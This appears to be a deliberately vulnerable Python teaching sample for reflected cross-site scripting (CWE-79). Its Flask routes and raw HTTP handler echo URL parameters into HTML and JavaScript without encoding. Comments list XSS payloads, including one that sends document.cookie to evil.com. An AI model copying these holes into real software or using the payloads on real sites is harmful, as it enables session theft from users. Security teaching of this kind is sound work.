# VULNERABLE: Reflected XSS - Training Sample
# CWE-79: Improper Neutralization of Input During Web Page Generation
# Severity: HIGH
# Description: Input from HTTP request is immediately reflected in HTML response
#              without encoding, allowing script injection in the victim's browser

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote
from flask import Flask, request, make_response

app = Flask(__name__)


# ── Raw HTTP server examples ──────────────────────────────────────────────────

class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if parsed.path == "/search":
            query = params.get("q", [""])[0]
            # VULN: query reflected verbatim — ?q=<script>alert(1)</script>
            body = f"""
            <html><body>
            <h2>Results for: {query}</h2>
            <p>No results found.</p>
            </body></html>
            """.encode()

        elif parsed.path == "/login":
            error = params.get("error", [""])[0]
            # VULN: error message from URL reflected in login form
            body = f"""
            <html><body>
            <form method='POST' action='/login'>
            <p class='error'>{error}</p>
            <input name='user'><input name='pass' type='password'>
            <button>Login</button>
            </form></body></html>
            """.encode()

        else:
            body = b"<html><body>Not found</body></html>"

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body)


# ── Flask reflected XSS examples ─────────────────────────────────────────────

@app.route("/welcome")
def welcome():
    """VULNERABLE: Username from URL reflected in welcome message."""
    user = request.args.get("user", "visitor")
    # VULN: user = "<script>document.location='http://evil.com/?c='+document.cookie</script>"
    html = f"<html><body><h1>Welcome, {user}!</h1></body></html>"
    return make_response(html)


@app.route("/feedback")
def feedback():
    """VULNERABLE: Feedback category and message both reflected."""
    category = request.args.get("cat", "general")
    msg = request.args.get("msg", "")
    # VULN: either param can carry a script payload
    return make_response(
        f"<html><body>"
        f"<h2>{category}</h2>"
        f"<p>{msg}</p>"
        f"</body></html>"
    )


@app.route("/404")
def not_found():
    """VULNERABLE: 404 page reflects requested URL."""
    path = request.args.get("path", request.path)
    # VULN: path = "<svg onload=alert(1)>" injected into 404 body
    return make_response(
        f"<html><body><h1>Page not found: {path}</h1></body></html>", 404
    )


@app.route("/newsletter")
def newsletter():
    """VULNERABLE: Email address reflected into confirmation page."""
    email = request.args.get("email", "")
    # VULN: email = '"onmouseover="alert(1)" style="width:100%;height:100%;position:fixed"'
    return make_response(
        f'<html><body>'
        f'<p>Subscribed: <span id="email">{email}</span></p>'
        f'</body></html>'
    )


@app.route("/lang")
def set_language():
    """VULNERABLE: Language setting reflected into HTML lang attribute."""
    lang = request.args.get("lang", "en")
    # VULN: lang = 'en" onload="alert(1)' breaks out of the attribute
    return make_response(
        f'<html lang="{lang}"><body><p>Language set.</p></body></html>'
    )


@app.route("/currency")
def currency():
    """VULNERABLE: Currency symbol reflected inside JavaScript variable."""
    symbol = request.args.get("sym", "USD")
    # VULN: symbol = "USD'; alert(document.cookie); //" breaks out of JS string
    html = f"""
    <html><body>
    <script>
    var currency = '{symbol}';
    document.write('Currency: ' + currency);
    </script>
    </body></html>
    """
    return make_response(html)


if __name__ == "__main__":
    # Run raw HTTP server
    server = HTTPServer(("0.0.0.0", 8080), VulnerableHandler)
    server.serve_forever()